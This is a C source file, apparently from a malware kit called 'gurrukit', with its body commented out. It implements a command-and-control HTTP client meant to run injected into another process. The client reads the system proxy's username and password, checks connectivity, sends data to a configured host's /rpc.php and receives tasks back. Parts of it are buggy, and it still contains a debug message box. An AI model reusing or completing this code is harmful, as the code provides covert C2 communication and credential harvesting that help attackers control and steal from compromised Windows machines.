#include <windows.h>
#include <wininet.h>
#include "include/gurrukit.h"
#include "include/memory.h"
#include "include/misc.h"
#include "include/gurru.h"
#include "include/reply.h"
//#include "include/config.h"
#include "include/http.h"





/* Not found from DLLMain is part of next version 
 * This functions run injected in process
 *

DWORD httpProxyConfig(PCCHTTP ccInfo) {
	DWORD dwOutLen, dwLen = 6000;
	INTERNET_PROXY_INFO *pQueryInfo = MemoryAlloc(6000);
	unsigned char *szUserName = MemoryAlloc(4096);
	unsigned char *szPass = MemoryAlloc(4096);
	DWORD dwRet = 0;

	if ((ccInfo->hInternet = InternetOpenW(ccInfo->wUserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, INTERNET_FLAG_ASYNC)) == NULL)
		return(0xCCCF);

	if (InternetQueryOptionA(ccInfo->hInternet, INTERNET_OPTION_PROXY, pQueryInfo, &dwLen) == TRUE)  {
		if (lstrlenA(pQueryInfo->lpszProxy) > 1) {
			ccInfo->wProxyUrl = MemoryAlloc(((lstrlenA(pQueryInfo->lpszProxy)+10)*2));
			AnsiToUnicode(pQueryInfo->lpszProxy, lstrlenA(pQueryInfo->lpszProxy), ccInfo->wProxyUrl, &dwOutLen);
			dwRet = 1;
		}
		else {
			if(!ccInfo->wProxyUrl)
				MemoryFree(ccInfo->wProxyUrl);

			ccInfo->wProxyUrl = ERROR_WSTR;
			return(dwRet);
		}
		
	}


	if (InternetQueryOptionA(ccInfo->hInternet, INTERNET_OPTION_PROXY_USERNAME, (void *)szUserName, &dwOutLen) == TRUE) {
		if (lstrlenA(szUserName) > 1) {
			ccInfo->wProxyUser = MemoryAlloc(((lstrlenA(szUserName) + 10) * 2));
			AnsiToUnicode(szUserName, lstrlenA(szUserName), ccInfo->wProxyUser, &dwOutLen);
		}
		else {
			if (ccInfo->wProxyUser)
				MemoryFree(ccInfo->wProxyUser);

			ccInfo->wProxyUser = ERROR_WSTR;
		}
	}


	if (InternetQueryOptionA(ccInfo->hInternet, INTERNET_OPTION_PROXY_PASSWORD, (void *)szPass, &dwOutLen) == TRUE) {
		if (lstrlenA(szPass) > 1) {
			ccInfo->wProxyPass = MemoryAlloc(((lstrlenA(szPass) + 10) * 2));
			AnsiToUnicode(szPass, lstrlenA(szPass), ccInfo->wProxyPass, &dwOutLen);
		}
		else {
			if (ccInfo->wProxyPass)
				MemoryFree(ccInfo->wProxyPass);
			
			ccInfo->wProxyPass = ERROR_WSTR;
		}
	}

	return(dwRet);
}


DWORD httpInit(PCCHTTP ccInfo) {
	DWORD dwFlag;
	BOOL bProxyStatus = FALSE, bDirectlyPossible = FALSE;
	DWORD dwConf;
	
	if (InternetGetConnectedState(&dwFlag, 0)) {
		if (dwFlag == INTERNET_CONNECTION_OFFLINE)
			return(0xCCCF); // ERROR_OFFLINE
	}

	if (dwFlag == INTERNET_CONNECTION_PROXY)
		bProxyStatus = TRUE;

	if ((InternetCheckConnectionW(ccInfo->wURL, FLAG_ICC_FORCE_CONNECTION, 0)) == FALSE) {
		if (bProxyStatus == FALSE )
			return(0xCCCE);		// ERROR_DIRECT_ACCESS
	}
	else {
		bDirectlyPossible = TRUE;
		if ((dwConf = httpProxyConfig(ccInfo)) == 0xCCCF && bProxyStatus == TRUE)
			return(0xCCCF);
		else
			bProxyStatus = FALSE;

		if (dwConf == 1)
			bProxyStatus = TRUE;
	}
	
	if (!bProxyStatus) {
		if ((ccInfo->hInternet = InternetOpenW(ccInfo->wUserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0)) == FALSE)
			return(0xCCCE);
		
		
		if ((ccInfo->hConnect = InternetConnectW(ccInfo->hInternet, ccInfo->wHost, ccInfo->usPort,0,0, INTERNET_SERVICE_HTTP, 0x04400000, 0)) == INVALID_HANDLE_VALUE)
			return(0xCCCE);

	}
	else {
		if ((ccInfo->hInternet = InternetOpenW(ccInfo->wUserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, INTERNET_FLAG_ASYNC)) == FALSE)
			return(0xCCCE);
	}


	return(1);
}


DWORD httpSend(PCCHTTP ccInfo, wchar_t *wData) {
	DWORD dwContext;
	BOOL bStatus = FALSE;
	//wchar_t *tmpReply = LocalMemoryAlloc(4098 * 2);
	INTERNET_BUFFERSW  WInetBuff;


	
	if ((ccInfo->hRequest = HttpOpenRequestW(ccInfo->hConnect, L"GET", L"/rpc.php", L"HTTP/1.1", NULL,NULL, 0xa404f700, NULL)) == INVALID_HANDLE_VALUE)
		return(0xCCCE);
	MessageBoxW(NULL, wData, L"DASDA", 0);
	

	bStatus = HttpSendRequestW(ccInfo->hRequest, 0,0,0,0);
	InternetReadFileExW(ccInfo->hRequest, &WInetBuff, IRF_NO_WAIT, &dwContext);
	
	InternetCloseHandle(ccInfo->hRequest);


	return(bStatus);
}

wchar_t *httpRecv(PCCHTTP ccInfo,wchar_t *wData) {
	DWORD dwContext;
	wchar_t *wTask;
	INTERNET_BUFFERSW  WInetBuff;

	if ((ccInfo->hConnect = InternetConnectW(ccInfo->hInternet, ccInfo->wHost, ccInfo->usPort, NULL, NULL, INTERNET_SERVICE_HTTP, CONNECT_HTTP_FLAGS, &dwContext)) == INVALID_HANDLE_VALUE)
		return((wchar_t *)NULL);


	if ((ccInfo->hRequest = HttpOpenRequestW(ccInfo->hConnect, L"POST", ccInfo->wURL, L"HTTP/1.1", NULL, NULL, REQUEST_HTTP_FLAGS, &dwContext)) == INVALID_HANDLE_VALUE)
		return((wchar_t *)NULL);

	HttpSendRequestW(ccInfo->hRequest, NULL, 0, wData, lstrlenW(wData));
	if (InternetReadFileExW(ccInfo->hInternet, &WInetBuff, IRF_NO_WAIT, &dwContext) == TRUE) {
		wTask = (wchar_t *)MemoryAlloc(WInetBuff.dwBufferLength * 2);
		RtlCopyMemory(wTask, WInetBuff.lpvBuffer, WInetBuff.dwBufferLength);
		return(wTask);
	}
	else
		wTask = NULL;

	InternetCloseHandle(ccInfo->hRequest);
	InternetCloseHandle(ccInfo->hConnect);

	return(wTask);
}
*/